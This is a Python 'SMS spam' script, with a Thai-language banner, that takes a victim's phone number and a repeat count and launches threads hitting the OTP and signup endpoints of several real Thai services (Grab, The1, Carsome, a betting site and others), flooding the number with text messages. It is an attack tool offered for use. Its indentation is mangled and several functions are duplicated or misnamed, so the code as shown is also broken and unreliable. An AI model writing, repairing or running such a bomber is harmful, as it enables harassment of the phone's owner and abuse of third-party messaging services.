import requests
from requests import post,Session
import sys
import threading
from re import search
phone = ""
amount = ""


  if len(sys.argv)==3:
               phone = sys.argv[1]
               amount = int(sys.argv[2])
               
  else:
  print("""
  ┌─────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                     │
│                         ███████╗ ██████╗ ███╗   ██╗███████╗                         │
│                         ██╔════╝██╔═══██╗████╗  ██║██╔════╝                         │
│                         █████╗  ██║   ██║██╔██╗ ██║█████╗                           │
│                         ██╔══╝  ██║   ██║██║╚██╗██║██╔══╝                           │
│                         ██║     ╚██████╔╝██║ ╚████║███████╗                         │
│                         ╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚══════╝                         │
│                                                                  SCRIPT  4.0    │
└─────────────────────────────────────────────────────────────────────────────────────┘
Spam Sms By : เอฟวันก๊อต
[+FB] : เอฟวันก๊อต
                                       """)
                                       print("Usage : python spamArgv.py < number > < amount >")
                                       print("วิธีใช้ : python spamArgv.py <เบอร์> <จำนวน>" )
                                       sys.exit(1)
                                       
                                       
                                       
                                       
                                       
                                       
                                       def cang01():
                                       useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
                                       def cang01():
                                       post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})
                                       print (f"Send number {phone} | Success ✓")
                                       
                                       def cang02():
                                       post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": "dec"}})
                                       print (f"Send number {phone} | Success ✓")
                                       
                                       def cang03():
                                       post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")
                                       print (f"Send number {phone} | Success ✓")
                                       
                                       def cang1():
                                       post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"}) 
                                       print (f"Send number {phone} | Success ✓")
                                       
                                       def cang2():
                                       post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
                                       print (f"Send number {phone} | Success ✓")
                                       
                                       def cand3():
                                       post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",json={
                                       "on": {
                                       "value": phone,
                                       "country": "66"
                                       },
                                       "type": "mobile"
                                        },headers={"accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8"}) 
       
       
                                        def cang4():
                                         post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})
                                         print (f"Send number {phone} | Success ✓")
                                         
                                         def cang5():
                                         post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": "+66"+phone,"password":"","client":"ecommerce"})
                                         print (f"Send number {phone} | Success ✓")
                                         
                                         def cang6():
                                         post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value": phone,"country":"66"},"type":"mobile"})
                                         print (f"Send number {phone} | Success ✓")
                                         
                                         def cang6():
                                         post("https://m.lucabet168.com/api/register-otp",json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
                                         print (f"Send number {phone} | Success ✓")
                                         
                                         def cang7():
                                         post("https://m.lucabet168.com/api/register-otp",json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
                                         print (f"Send number {phone} | Success ✓")
                                         
                                         
                                         for i in range(amount):
                                         threading.Thread(target=cang01).start()
                                         threading.Thread(target=cang02).start()
                                         threading.Thread(target=cang03).start()
                                         threading.Thread(target=cang1).start()
                                         threading.Thread(target=cang2).start()
                                         threading.Thread(target=cang3).start()
                                         threading.Thread(target=cang4).start()
                                         threading.Thread(target=cang5).start()
                                         threading.Thread(target=cang6).start()
                                         threading.Thread(target=cang7).start()